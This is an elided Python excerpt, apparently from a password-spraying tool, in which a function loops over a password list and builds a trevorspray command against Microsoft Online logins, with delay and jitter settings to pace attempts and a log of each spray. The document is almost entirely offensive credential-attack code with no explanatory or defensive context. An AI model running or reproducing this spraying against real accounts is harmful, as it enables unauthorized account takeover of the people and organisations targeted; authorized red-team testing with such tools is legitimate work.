...
def msolSpray(configs):
    print("[*] Starting the MSOL module.")
    #print(configs)
    ...
    for password in passwords:   
        ...
        print(f"[*] Starting MSOL spray #{sprayTimes} using password: {password.strip()} time is {datetime.now()}\n") 
        log_file.write(f"[*] Starting MSOL spray #{sprayTimes} using password: {password.strip()} time is {datetime.now()}\n")
        spray = f"trevorspray -u {emailFile} -p '{password.strip()}' -m msol --url {targetUrl} -d {delay} -j {jitter}"
        ...
        print(f"[*] Spray #{sprayTimes} finished at {datetime.now()}\n")
...
if __name__ == "__main__":
    ...
    print("Running Module directly is not going to work")
